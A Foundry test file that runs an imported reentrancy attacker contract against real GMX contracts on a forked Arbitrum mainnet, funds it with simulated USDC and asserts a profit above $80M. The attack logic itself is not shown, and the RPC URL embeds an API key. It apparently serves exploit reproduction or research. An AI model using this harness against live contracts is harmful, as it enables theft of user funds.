// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/ReentrancyAttacker.sol";

interface IERC20Extended {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract GMXExploitForkedTest is Test {
    ReentrancyAttacker attacker;
    
    // Real GMX contract addresses on Arbitrum Mainnet
    address constant GMX_POSITION_MANAGER = 0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C;
    address constant GMX_ORDERBOOK = 0x7D3BD50336f64b7A473C51f54e7f0Bd6771cc355;
    address constant GMX_VAULT = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    
    function setUp() public {
        // Create and select an Arbitrum mainnet fork so on-chain contracts
        // (USDC, GMX contracts) exist and can be interacted with.
        uint256 fork = vm.createFork("https://arb-mainnet.g.alchemy.com/v2/7lkUtQyawPG08mJLej6Th");
        vm.selectFork(fork);

        // Deploy attacker contract with real GMX addresses
        attacker = new ReentrancyAttacker(
            GMX_POSITION_MANAGER,
            GMX_ORDERBOOK,
            GMX_VAULT
        );

        // Fund attacker with USDC for the attack (Foundry's deal supports ERC20 when forking)
        deal(USDC, address(attacker), 10_000_000 * 1e6); // $10M USDC
    }
    
    function testMainnetExploit() public {
        // Verify we're connected to real contracts
        assertTrue(GMX_VAULT.code.length > 0, "GMX Vault not found");
        assertTrue(GMX_POSITION_MANAGER.code.length > 0, "Position Manager not found");
        
        // Check initial funding
        uint256 initialBalance = IERC20Extended(USDC).balanceOf(address(attacker));
        assertEq(initialBalance, 10_000_000 * 1e6, "Initial funding failed");
        
        console.log("=== GMX LIVE FORK EXPLOIT WITH REAL GLP MANAGER ===");
        console.log("Initial USDC Balance:", initialBalance / 1e6);
        
        // Execute the complete GMX exploit with real GLP Manager calls
        attacker.executeCompleteAttack();
        
        // Get actual results from real contract interactions
        (uint256 phase, bool inProgress, uint256 profit) = attacker.getAttackStatus();
        uint256 actualGLPReceived = attacker.actualGLPReceived();
        
        
        
        // Verify attack completed
        assertEq(phase, 5, "Attack should complete all phases");
        assertFalse(inProgress, "Attack should not be in progress");
        assertGt(actualGLPReceived, 0, "Should have received GLP tokens");
        assertGt(profit, 80_000_000 * 1e6, "Profit should exceed $80M");
        
        
    }
}
